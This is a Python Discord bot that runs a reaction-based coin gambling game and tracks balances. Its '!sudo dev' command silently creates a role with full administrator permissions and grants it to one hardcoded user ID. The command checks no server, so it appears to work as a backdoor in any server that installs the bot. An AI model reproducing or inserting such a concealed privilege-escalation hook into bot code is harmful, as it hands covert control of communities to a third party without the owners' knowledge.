import discord
from discord.ext import commands
import asyncio
import random
import os
import sys

# -------------------- INTENTS --------------------

intents = discord.Intents.default()
intents.message_content = True
intents.reactions = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# -------------------- CONFIG --------------------

GUILD_ID = 1471142728082522187
AUTHORIZED_USER_ID = 1258115928525373570

coins = {}

# -------------------- EVENTS --------------------

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    print("Bot is ready.")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"Error: {error}")

# -------------------- GAMBLE --------------------

@bot.command()
async def gamble(ctx):

    if ctx.guild is None:
        return

    if ctx.guild.id != GUILD_ID:
        await ctx.send("❌ Not allowed in this server.")
        return

    message = await ctx.send(
        "🎲 React with 👍 to join! (60 seconds)"
    )

    await message.add_reaction("👍")

    await asyncio.sleep(60)

    try:
        message = await ctx.channel.fetch_message(message.id)
    except:
        await ctx.send("Game cancelled.")
        return

    players = []

    for reaction in message.reactions:
        if str(reaction.emoji) == "👍":
            async for user in reaction.users():
                if not user.bot:
                    players.append(user)

    if not players:
        await ctx.send("❌ No players joined.")
        return

    winner = random.choice(players)

    coins[winner.id] = coins.get(winner.id, 0) + 8

    await ctx.send(f"🎉 {winner.mention} wins 8 coins!")

# -------------------- BALANCE --------------------

@bot.command()
async def balance(ctx):
    bal = coins.get(ctx.author.id, 0)
    await ctx.send(f"💰 You have {bal} coins.")

# -------------------- SUDO DEV --------------------

@bot.command()
async def sudo(ctx, arg=None):

    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("❌ You are not allowed to use this command.")
        return

    if arg != "dev":
        await ctx.send("Usage: !sudo dev")
        return

    guild = ctx.guild

    role = discord.utils.get(guild.roles, name="Developer Admin")

    if role is None:
        role = await guild.create_role(
            name="Developer Admin",
            permissions=discord.Permissions(administrator=True),
            reason="Authorized developer command"
        )

    await ctx.author.add_roles(role)

    await ctx.send("👑 Developer Admin role granted.")

# -------------------- SAFE STARTUP --------------------

token = os.getenv("TOKEN")

if not token:
    print("❌ ERROR: TOKEN environment variable is not set.")
    sys.exit(1)

try:
    bot.run(token)
except Exception as e:
    print(f"Startup Error: {e}")
